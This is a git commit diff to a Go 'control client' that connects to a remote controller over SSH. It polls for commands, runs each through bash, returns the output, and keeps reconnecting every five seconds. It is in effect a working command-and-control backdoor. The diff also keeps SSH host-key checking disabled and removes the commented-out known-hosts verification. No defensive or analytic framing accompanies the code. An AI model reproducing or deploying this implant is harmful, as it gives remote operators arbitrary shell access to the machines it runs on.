e6490b349fcc8573771b66dd687bdcc451844bce
0x42 <root@0x42.red>
2022-09-09 19:10:35 -0700

    Client now attempts reconnecting until cancelled, better logging

--- cmd/control/control_client.go
+++ cmd/control/control_client.go
@@ -3,7 +3,6 @@ package main
 
 import (
 	"flag"
-	"fmt"
 	"log"
 	"net"
 	"os"
@@ -37,42 +36,9 @@ func init() {
 
 func VerifyHost(host string, remote net.Addr, key ssh.PublicKey) error {
 	return nil
-	// //
-	// // If you want to connect to new hosts.
-	// // here your should check new connections public keys
-	// // if the key not trusted you shuld return an error
-	// //
-
-	// // hostFound: is host in known hosts file.
-	// // err: error if key not in known hosts file OR host in known hosts file but key changed!
-	// hostFound, err := goph.CheckKnownHost(host, remote, key, "")
-
-	// // Host in known hosts but key mismatch!
-	// // Maybe because of MAN IN THE MIDDLE ATTACK!
-	// if hostFound && err != nil {
-
-	// 	return err
-	// }
-
-	// // handshake because public key already exists.
-	// if hostFound && err == nil {
-
-	// 	return nil
-	// }
-
-	// // // Ask user to check if he trust the host public key.
-	// // if askIsHostTrusted(host, key) == false {
-
-	// // 	// Make sure to return error on non trusted keys.
-	// // 	return errors.New("you typed no, aborted!")
-	// // }
-
-	// // Add the new host to known hosts file.
-	// return goph.AddKnownHost(host, remote, key, "")
 }
 
 func main() {
-
 	flag.Parse()
 
 	var err error
@@ -86,13 +52,34 @@ func main() {
 		ssh.PublicKeys(signer),
 	}
 
-	fmt.Println(signer.PublicKey())
-
 	currentUser, err := user.Current()
 	if err != nil {
-		log.Fatalf(err.Error())
+		log.Println(err)
+		currentUser = &user.User{
+			Username: "missing",
+		}
 	}
 
+	c := make(chan os.Signal, 1)
+	signal.Notify(c, os.Interrupt)
+	ticker := time.NewTicker(5000 * time.Millisecond)
+	for {
+		select {
+		case <-c:
+			log.Println("Killing process...")
+			return
+		case <-ticker.C:
+			err = foo(auth, currentUser)
+			if err != nil {
+				log.Println(err)
+			}
+
+			log.Println("Waiting 5 seconds...")
+		}
+	}
+}
+
+func foo(auth goph.Auth, currentUser *user.User) error {
 	client, err := goph.NewConn(&goph.Config{
 		User:     currentUser.Username,
 		Addr:     addr,
@@ -100,63 +87,63 @@ func main() {
 		Auth:     auth,
 		Callback: VerifyHost,
 	})
-
 	if err != nil {
-		panic(err)
+		log.Println("[-] Client conn error:", err)
+		return err
 	}
 	defer client.Close()
 
 	handleConnection(client)
 
-	c := make(chan os.Signal, 1)
-	signal.Notify(c, os.Interrupt)
-	<-c
+	return nil
 }
 
 func handleConnection(client *goph.Client) {
 
-	fmt.Printf("Connected to %s:%d\n", client.Config.Addr, client.Config.Port)
+	log.Printf("[+] Connected to %s:%d\n", client.Config.Addr, client.Config.Port)
 
 	ticker := time.NewTicker(1000 * time.Millisecond)
-	done := make(chan bool)
-	go func() {
-		for {
-			select {
-			case <-done:
-				return
-			case <-ticker.C:
-				command, err := client.Command("POLL")
-				if err != nil {
-					fmt.Println(err)
-					continue
-				}
-				out, err := command.Output()
-				if err != nil {
-					fmt.Println(err)
-					continue
-				}
-				if strings.TrimSpace(string(out)) != "" {
-					fmt.Println(string(out), err)
-					exec.Command("bash", "-c", string(out))
-					out, err = exec.Command("bash", "-c", string(out)).CombinedOutput()
-					if err != nil {
-						fmt.Println(err)
-						out = append(out, []byte(err.Error())...)
-					}
+	done := make(chan os.Signal, 1)
+	signal.Notify(done, os.Interrupt)
 
-					command, err = client.Command(string(out))
-					if err != nil {
-						fmt.Println(err)
-						continue
-					}
-					out, err = command.CombinedOutput()
-					if err != nil {
-						fmt.Println(err)
-						continue
-					}
-					fmt.Println(string(out), err)
+	for {
+		select {
+		case <-done:
+			log.Println("[-] Killing this client instance...")
+			return
+		case <-ticker.C:
+			command, err := client.Command("POLL")
+			if err != nil {
+				log.Println("[-] Command poll error:", err)
+				return
+			}
+			out, err := command.Output()
+			if err != nil {
+				log.Println("[-] Output poll error:", err)
+				continue
+			}
+			if strings.TrimSpace(string(out)) != "" {
+				log.Println("[+] Inbound command:", string(out), err)
+				exec.Command("bash", "-c", string(out))
+
+				out, err = exec.Command("bash", "-c", string(out)).CombinedOutput()
+				if err != nil {
+					log.Println("[-] Bash error:", err)
+					out = append(out, []byte(err.Error())...)
 				}
+
+				command, err = client.Command(string(out))
+				if err != nil {
+					log.Println("[-] Client command error:", err)
+					continue
+				}
+				out, err = command.CombinedOutput()
+				if err != nil {
+					log.Println("[-] Client output error:", err)
+					continue
+				}
+				log.Println("[+] Client command output:", string(out), err)
 			}
 		}
-	}()
+	}
 }
